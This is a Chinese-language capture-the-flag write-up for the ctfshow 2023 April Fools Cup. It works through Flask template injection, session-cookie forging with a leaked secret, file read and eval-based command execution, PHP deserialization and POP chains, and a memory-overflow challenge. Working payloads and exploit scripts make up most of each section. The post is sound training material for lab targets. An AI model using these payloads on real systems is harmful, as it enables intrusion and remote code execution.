+++
title = "ctfshow2023愚人杯"
slug = "ctfshow-2023-april-fools-cup"
description = ""
date = "2024-08-08T17:32:43"
lastmod = "2024-08-08T17:32:43"
image = ""
license = ""
categories = ["ctfshow"]
tags = ["php", "ssti"]
+++

# ezssti

```python
from flask import Flask
from flask import render_template_string,render_template
app = Flask(__name__)

@app.route('/hello/')
def hello(name=None):
    return render_template('hello.html',name=name)
@app.route('/hello/<name>')
def hellodear(name):
    if "ge" in name:
        return render_template_string('hello %s' % name)
    elif "f" not in name:
        return render_template_string('hello %s' % name)
    else:
        return 'Nonononon'
```

测试出来传参方式之后发现`/`过滤了
然后我们就直接base64绕过吧

```
url/hello/{{g.pop.__globals__.__builtins__['__import__']('os').popen('echo dGFjIC9mKg==|base64 -d|sh').read()}}
```

# easy_signin
`url`里面参数很明显但是试了`filter`协议和`flag.php`都不行，那看看源码(访问`/index.php`)

```url
https://b64cd330-9b26-4861-9b2c-67fa244be165.challenge.ctf.show/?img=aW5kZXgucGhw
```

发现一个图片无法显示,查看源代码解码得到flag

# easy_flask

```
# app.py
from flask import Flask, render_template, request, redirect, url_for, session, send_file, Response


app = Flask(__name__)


app.secret_key = 'S3cr3tK3y'

users = {

}

@app.route('/')
def index():
# Check if user is loggedin
if 'loggedin' in session:
return redirect(url_for('profile'))
return redirect(url_for('login'))

@app.route('/login/', methods=['GET', 'POST'])
def login():
msg = ''
if request.method == 'POST' and 'username' in request.form and 'password' in request.form:
username = request.form['username']
password = request.form['password']
if username in users and password == users[username]['password']:
session['loggedin'] = True
session['username'] = username
session['role'] = users[username]['role']
return redirect(url_for('profile'))
else:
msg = 'Incorrect username/password!'
return render_template('login.html', msg=msg)


@app.route('/register/', methods=['GET', 'POST'])
def register():
msg = ''
if request.method == 'POST' and 'username' in request.form and 'password' in request.form:
username = request.form['username']
password = request.form['password']
if username in users:
msg = 'Account already exists!'
else:
users[username] = {'password': password, 'role': 'user'}
msg = 'You have successfully registered!'
return render_template('register.html', msg=msg)



@app.route('/profile/')
def profile():
if 'loggedin' in session:
return render_template('profile2.html', username=session['username'], role=session['role'])
return redirect(url_for('login'))

........

```
给了个密钥那肯定是要修改session为admin

```
eyJsb2dnZWRpbiI6dHJ1ZSwicm9sZSI6InVzZXIiLCJ1c2VybmFtZSI6IjEyMyJ9.ZrDMlg.Ekl2r4BVVam_XXf--rWyoaDaNHk

```
有个一个开源脚本`flask_session_cookie_manager3.py`可以直接修改flask的cookie值
```
python3 flask_session_cookie_manager3.py decode -c 'eyJsb2dnZWRpbiI6dHJ1ZSwicm9sZSI6InVzZXIiLCJ1c2VybmFtZSI6IjEyMyJ9.ZrDMlg.Ekl2r4BVVam_XXf--rWyoaDaNHk' -s 'S3cr3tK3y'

{'loggedin': True, 'role': 'user', 'username': '123'}

python3 flask_session_cookie_manager3.py encode -t "{'loggedin': True, 'role': 'admin', 'username': '123'}" -s 'S3cr3tK3y'

eyJsb2dnZWRpbiI6dHJ1ZSwicm9sZSI6ImFkbWluIiwidXNlcm5hbWUiOiIxMjMifQ.ZrDRUg.t7_WdrPpPdMtEAnjypjXyH8FSwU
```

伪造cookie之后,查看源代码发现有个任意文件读取漏洞

```
https://5d9ac37c-eb1a-465c-b756-266b55182087.challenge.ctf.show/download/?filename=app.py
```

```python
# app.py
from flask import Flask, render_template, request, redirect, url_for, session, send_file, Response


app = Flask(__name__)


app.secret_key = 'S3cr3tK3y'

users = {
    'admin': {'password': 'LKHSADSFHLA;KHLK;FSDHLK;ASFD', 'role': 'admin'}
}



@app.route('/')
def index():
    # Check if user is loggedin
    if 'loggedin' in session:
        return redirect(url_for('profile'))
    return redirect(url_for('login'))

@app.route('/login/', methods=['GET', 'POST'])
def login():
    msg = ''
    if request.method == 'POST' and 'username' in request.form and 'password' in request.form:
        username = request.form['username']
        password = request.form['password']
        if username in users and password == users[username]['password']:
            session['loggedin'] = True
            session['username'] = username
            session['role'] = users[username]['role']
            return redirect(url_for('profile'))
        else:
            msg = 'Incorrect username/password!'
    return render_template('login2.html', msg=msg)


@app.route('/register/', methods=['GET', 'POST'])
def register():
    msg = '' 
    if request.method == 'POST' and 'username' in request.form and 'password' in request.form:
        username = request.form['username']
        password = request.form['password']
        if username in users:
            msg = 'Account already exists!'
        else:
            users[username] = {'password': password, 'role': 'user'}
            msg = 'You have successfully registered!'
    return render_template('register2.html', msg=msg)



@app.route('/profile/')
def profile():
    if 'loggedin' in session:
        return render_template('profile2.html', username=session['username'], role=session['role'])
    return redirect(url_for('login'))


@app.route('/show/')
def show():
    if 'loggedin' in session:
        return render_template('show2.html')

@app.route('/download/')
def download():
    if 'loggedin' in session:
        filename = request.args.get('filename')
        if 'filename' in request.args:              
            return send_file(filename, as_attachment=True)
  
    return redirect(url_for('login'))


@app.route('/hello/')
def hello_world():
    try:
        s = request.args.get('eval')
        return f"hello,{eval(s)}"
    except Exception as e:
        print(e)
        pass
        
    return "hello"
    


@app.route('/logout/')
def logout():
   session.pop('loggedin', None)
   session.pop('id', None)
   session.pop('username', None)
   session.pop('role', None)
   return redirect(url_for('login'))


if __name__ == "__main__":
    app.run(host='0.0.0.0', port=8080)
```

审计代码发现一个RCE

```
https://5d9ac37c-eb1a-465c-b756-266b55182087.challenge.ctf.show/hello/?eval=__import__('os').popen('tac /f*').read()
```

# easy_php
一眼反序列化

```php
<?php

error_reporting(0);
highlight_file(__FILE__);

class ctfshow{

    public function __wakeup(){
        die("not allowed!");
    }

    public function __destruct(){
        system($this->ctfshow);
    }

}

$data = $_GET['1+1>2'];

if(!preg_match("/^[Oa]:[\d]+/i", $data)){
    unserialize($data);
}


?>
```
这里的过滤是不允许Oa开头那么试试用+绕过

EXP:

```php
<?php
class ctfshow{
    public $ctfshow='whoami';

}
$a=serialize(new ctfshow());
$a= preg_replace('/O:/', 'O:+', $a);
echo $a;
?>
```

无回显

那么再试试把O替换成C来绕过呢

```
?1%2b1>2=C:7:"ctfshow":1:{s:7:"ctfshow";s:6:"whoami";}
```

还是没有回显

那么就要考虑用自带的类了
查看环境中的内置类
```php
<?php
$classes = get_declared_classes();
foreach ($classes as $class) {

    $methods = get_class_methods($class);

    foreach ($methods as $method) {
        if (in_array($method, array('unserialize',))) {
            print $class . '::' . $method . "\n";
        }
    }
}

ArrayObject::unserialize
ArrayIterator::unserialize
RecursiveArrayIterator::unserialize
SplDoublyLinkedList::unserialize
SplQueue::unserialize
SplStack::unserialize
SplObjectStorage::unserialize
```
这里考虑使用`ArrayObject`

EXP:

```php
<?php
class ctfshow{
    public $ctfshow='tac /f*';

}
$a=new ArrayObject();
$a->a=new ctfshow();
echo serialize($a);
//$a= preg_replace('/O:/', 'O:+', $a);

?>
```

上面的这些类只要能打出序列化字符串的都可以用（亲测）

最后传参即可打通

```url
url/?1%2b1>2O:11:"ArrayObject":3:{i:0;i:0;i:1;a:0:{}i:2;a:1:{s:1:"a";O:7:"ctfshow":1:{s:7:"ctfshow";s:7:"tac /f*";}}}
```

# easy_class
一个pwn的溢出

```php
<?php

namespace ctfshow;


class C{

    const __REF_OFFSET_1 = 0x41;
    const __REF_OFFSET_2 = 0x7b;
    const __REF_OFFSET_3 = 0x5b;
    const __REF_OFFSET_4 = 0x60;
    const __REF_OFFSET_5 = 0x30;
    const __REF_OFFSET_6 = 0x5f;

    const __REF_SIZE__= 20;
    const __REF_VAL_SIZE__= 50;

    private $cursor=0;
    private $cache;
    private $ref_table=[];

    

    function main(){
        $flag = md5(file_get_contents("/flag"));
        $this->define('ctfshow',self::__REF_VAL_SIZE__);
        $this->define('flag',strlen($flag));
        $this->neaten();
        $this->fill('flag',$flag);
        $this->fill('ctfshow',$_POST['data']);
        
        if($this->read('ctfshow')===$this->read('flag')){
            echo $flag;
        }
    }

    private function fill($ref,$val){
        rewind($this->cache);
        fseek($this->cache, $this->ref_table[$ref]+23);


        $arr = str_split($val);

        foreach ($arr as $s) {
            fwrite($this->cache, pack("C",ord($s)));
        }

        for ($i=sizeof($arr); $i < self::__REF_VAL_SIZE__; $i++) { 
            fwrite($this->cache, pack("C","\x00"));
        }

        $this->cursor= ftell($this->cache);
    }

    public static function clear($var){
        ;
    }

    private function neaten(){
        $this->ref_table['_clear_']=$this->cursor;
        $arr = str_split("_clear_");
        foreach ($arr as $s) {
            $this->write(ord($s),"C");
        }
        for ($i=sizeof($arr); $i < self::__REF_SIZE__; $i++) { 
            $this->write("\x00",'C');
        }

        $arr = str_split(__NAMESPACE__."\C::clear");
        foreach ($arr as $s) {
            $this->write(ord($s),"C");
        }

        $this->write(0x36d,'Q');
        $this->write(0x30,'C');

        for ($i=1; $i < self::__REF_SIZE__; $i++) { 
            $this->write("\x00",'C');
        }


    }

    private function readNeaten(){
        rewind($this->cache);
        fseek($this->cache, $this->ref_table['_clear_']+self::__REF_SIZE__);
        $f = $this->truncation(fread($this->cache, self::__REF_SIZE__-4));
        $t = $this->truncation(fread($this->cache, self::__REF_SIZE__-12));
        $p = $this->truncation(fread($this->cache, self::__REF_SIZE__));
        call_user_func($f,$p);

    }

    private function define($ref,$size){
        
        $this->checkRef($ref);
        $r = str_split($ref);
        $this->ref_table[$ref]=$this->cursor;
        foreach ($r as $s) {
            $this->write(ord($s),"C");
        }
        for ($i=sizeof($r); $i < self::__REF_SIZE__; $i++) { 
            $this->write("\x00",'C');
        }


        fwrite($this->cache,pack("v",$size));
        fwrite($this->cache,pack("C",0x31));
        $this->cursor= ftell($this->cache);

        for ($i=0; $i < $size; $i++) { 
            $this->write("\x00",'a');
        }
        
    }

    private function read($ref){

        if(!array_key_exists($ref,$this->ref_table)){
            throw new \Exception("Ref not exists!", 1);
        }

        if($this->ref_table[$ref]!=0){
            $this->seekCursor($this->ref_table[$ref]);
        }else{
            rewind($this->cache);
        }
        
        $cref = fread($this->cache, 20);
        $csize = unpack("v", fread($this->cache, 2));
        $usize = fread($this->cache, 1);

        $val = fread($this->cache, $csize[1]);

        return $this->truncation($val);

        
    }


    private function write($val,$fmt){
        $this->seek();
        fwrite($this->cache,pack($fmt,$val));
        $this->cursor= ftell($this->cache);
    }

    private function seek(){
        rewind($this->cache);
        fseek($this->cache, $this->cursor);
    }

    private function truncation($data){

        return implode(array_filter(str_split($data),function($var){
            return $var!=="\x00";
        }));

    }
    private function seekCursor($cursor){
        rewind($this->cache);
        fseek($this->cache, $cursor);
    }
    private function checkRef($ref){
        $r = str_split($ref);

        if(sizeof($r)>self::__REF_SIZE__){
            throw new \Exception("Refenerce size too long!", 1);
        }

        if(is_numeric($r[0]) || $this->checkByte($r[0])){
            throw new \Exception("Ref invalid!", 1);
        }

        array_shift($r);

        foreach ($r as $s) {

            if($this->checkByte($s)){
                throw new \Exception("Ref invalid!", 1);
            }
        }
    }

    private function checkByte($check){
        if(ord($check) <=self::__REF_OFFSET_5 || ord($check) >=self::__REF_OFFSET_2 ){
            return true;
        }

        if(ord($check) >=self::__REF_OFFSET_3 && ord($check) <= self::__REF_OFFSET_4 
            && ord($check) !== self::__REF_OFFSET_6){
            return true;
        }

        return false;

    }

    function __construct(){
        $this->cache=fopen("php://memory","wb");
    }

    public function __destruct(){
        $this->readNeaten();
        fclose($this->cache);
    }

}
highlight_file(__FILE__);
error_reporting(0);
$c = new C;

$c->main();
```

```
data=aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaab%00system%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00tac%20/f*
```

# 暗网聊天室
一个密码题这里借用师傅的脚本
```python
import re
import requests
from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_v1_5
from flask import Flask, request, abort

url = 'http://xxx.challenge.ctf.show/' # 题目URL，先等几秒再运行

# 加密
def encrypt(plaintext, public_key):
    cipher = PKCS1_v1_5.new(RSA.importKey(public_key))

    ciphertext = ''
    for i in range(0, len(plaintext), 128):
        ciphertext += cipher.encrypt(plaintext[i:i+128].encode('utf-8')).hex()

    return ciphertext

def get_plaintext_half():
    text = requests.get(url+'/update').text
    return re.findall('[^@]*\.92', text)[0]

def get_public_key(public_key):
    text = requests.get(url+'/shop?api=127.0.0.1:9999').text
    return re.findall('-----BEGIN PUBLIC KEY-----\n.*\n.*\n.*\n.*\n.*\n.*\n.*\n-----END PUBLIC KEY-----', text)[public_key-1]

IP = '2.56.12.89'
plaintext_half = get_plaintext_half() # 获取解密后的数据

# 获取公钥2、3
public_key2 = get_public_key(2).replace('\n','').replace('-----BEGIN PUBLIC KEY-----','-----BEGIN PUBLIC KEY-----\n').replace('-----END PUBLIC KEY-----','\n-----END PUBLIC KEY-----')
public_key3 = get_public_key(3).replace('\n','').replace('-----BEGIN PUBLIC KEY-----','-----BEGIN PUBLIC KEY-----\n').replace('-----END PUBLIC KEY-----','\n-----END PUBLIC KEY-----')

# 两次加密
IP_ciphertext = encrypt(IP, public_key3)
IP_ciphertext = encrypt(IP_ciphertext, public_key2)

# 替换最终IP
plaintext_half_new = plaintext_half[:2048] + IP_ciphertext + plaintext_half[4096:]

# 请求
requests.post(url + '/pass_message',data = {'message':plaintext_half_new})
# 接收明文
text = requests.get(url+'/update').text
flag = re.findall('ctfshow{.*}', text)[0]
print(flag)
input()
```

# 被遗忘的反序列化

```php
<?php

# 当前目录中有一个txt文件哦
error_reporting(0);
show_source(__FILE__);
include("check.php");

class EeE{
    public $text;
    public $eeee;
    public function __wakeup(){
        if ($this->text == "aaaa"){
            echo lcfirst($this->text);
        }
    }

    public function __get($kk){
        echo "$kk,eeeeeeeeeeeee";
    }

    public function __clone(){
        $a = new cycycycy;
        $a -> aaa();
    }
    
}

class cycycycy{
    public $a;
    private $b;

    public function aaa(){
        $get = $_GET['get'];
        $get = cipher($get);
        if($get === "p8vfuv8g8v8py"){
            eval($_POST["eval"]);
        }
    }


    public function __invoke(){
        $a_a = $this -> a;
        echo "\$a_a\$";
    }
}

class gBoBg{
    public $name;
    public $file;
    public $coos;
    private $eeee="-_-";
    public function __toString(){
        if(isset($this->name)){
            $a = new $this->coos($this->file);    //将coos作为类使用
            echo $a;
        }else if(!isset($this -> file)){
            return $this->coos->name;
        }else{
            $aa = $this->coos;
            $bb = $this->file;
            return $aa();
        }
    }
}   

class w_wuw_w{
    public $aaa;
    public $key;
    public $file;
    public function __wakeup(){
        if(!preg_match("/php|63|\*|\?/i",$this -> key)){
            $this->key = file_get_contents($this -> file);
        }else{
            echo "不行哦";
        }
    }

    public function __destruct(){
        echo $this->aaa;
    }

    public function __invoke(){
        $this -> aaa = clone new EeE;
    }
}

$_ip = $_SERVER["HTTP_AAAAAA"];
unserialize($_ip);
```
传参方式首先是`HTTP`头来传参，再者有个`txt`文件需要读

```
lcfirst() 是 PHP 中的一个字符串处理函数，它的作用是将给定字符串的第一个字符转换为小写。
```

审计代码，发现有个`cipher`方法我们不知道，如果知道的话，传参就可以直接RCE了
其后发现本身写的类`w_wuw_w`就可以读取文件
EXP1
```php
<?php
class w_wuw_w{
    public $aaa;
    public $key;
    public $file;
    public function __wakeup(){
        if(!preg_match("/php|63|\*|\?/i",$this -> key)){
            $this->key = file_get_contents($this -> file);
        }else{
            echo "不行哦";
        }
    }

    public function __destruct(){
        echo $this->aaa;
    }

    public function __invoke(){
        $this -> aaa = clone new EeE;
    }
}
$a = new w_wuw_w();
$a->file = "php://filter/convert.base64-encode/resource=check.php";
$a->aaa = &$a->key;
echo serialize($a);
```
思路在destruct方法中通过两次赋值获得文件内容
可以直接来了
EXP2
```php
<?php

class w_wuw_w{
    public $aaa;
    public $key;
    public $file="php://filter/convert.base64-encode/resource=check.php";

}
$a=new w_wuw_w();
$a->aaa=&$a->key;
echo serialize($a);
```
得到`check.php`

```php
<?php

function cipher($str) {

    if(strlen($str)>10000){
        exit(-1);
    }

    $charset = "qwertyuiopasdfghjklzxcvbnm123456789";
    $shift = 4;
    $shifted = "";

    for ($i = 0; $i < strlen($str); $i++) {
        $char = $str[$i];
        $pos = strpos($charset, $char);

        if ($pos !== false) {
            $new_pos = ($pos - $shift + strlen($charset)) % strlen($charset);
            $shifted .= $charset[$new_pos];
        } else {
            $shifted .= $char;
        }
    }

    return $shifted;
}
```
你猜我为什么没有读`hint.txt`,是我不想读嘛，🙂
欧克，现在得到了`cipher`方法了,位移为4 的一个加密算法，我们解密试试

```
$new_pos = ($pos - $shift + strlen($charset)) % strlen($charset); 
为了将密文位置向左边移动4位，那么+ strlen($charset)其实是处理负数，但是由于取余可以处理负数，所以我们可以将代码简化为
$new_pos = ($pos - $shift ) % strlen($charset); 
所以加密的就是把 - 变为 +
```
EXP：

```php
<?php
function cipher($str) {
    if (strlen($str) > 10000) {
        exit(-1);
    }

    $charset = "qwertyuiopasdfghjklzxcvbnm123456789";
    $shift = 4;
    $original = "";

    for ($i = 0; $i < strlen($str); $i++) {
        $char = $str[$i];
        $pos = strpos($charset, $char);

        if ($pos !== false) {
            $new_pos = ($pos + $shift) % strlen($charset); 
            $shifted .= $charset[$new_pos];
        } else {
            $original .= $char;
        }
    }

    return $shifted;
}
echo cipher('p8vfuv8g8v8py');
?>
```

得到密文`fe1ka1ele1efp`
**那么我们还是需要触发反序列化才可以RCE，前面提到需要把coos作为类来使用**

```php
<?php
class gBoBg{
    public $file="";
    public $coos;

}
class w_wuw_w{
    public $aaa;
}
$a=new w_wuw_w();
$b=new gBoBg();

$b->coos=$a;    //触发__toString
$a->aaa=$b; //触发__invoke
echo serialize($a);
```

```
https://84175f19-1c8d-4c07-9706-ebce0977f416.challenge.ctf.show/?get=fe1ka1ele1efp
POST ：
eval=echo `tac /f*`;
HEADER：
aaaaaa:O:7:"w_wuw_w":1:{s:3:"aaa";O:5:"gBoBg":2:{s:4:"file";s:0:"";s:4:"coos";r:1;}}
```
